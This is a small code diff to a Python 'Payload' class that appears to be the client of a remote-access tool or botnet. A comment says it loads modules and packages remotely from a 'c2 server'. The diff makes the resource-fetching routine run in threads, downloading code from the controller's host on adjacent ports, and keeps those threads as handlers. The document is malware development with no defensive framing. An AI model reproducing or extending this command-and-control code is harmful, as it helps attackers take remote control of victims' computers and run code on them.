@@ -168,7 +168,7 @@ class Payload():
         self.connection.sendall(msg)
         return info
 
-
+    @threaded
     def _get_resources(self, target=None, base_url=None):
         if sys.version_info[0] < 3:
             from urllib import urlretrieve
@@ -1059,8 +1059,8 @@ class Payload():
         host, port = self.connection.getpeername()
 
         # run 2 threads which remotely load packages/modules from c2 server
-        self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
-        self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
+        self.handlers['module_handler'] = self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
+        self.handlers['package_handler'] = self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
         self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
 
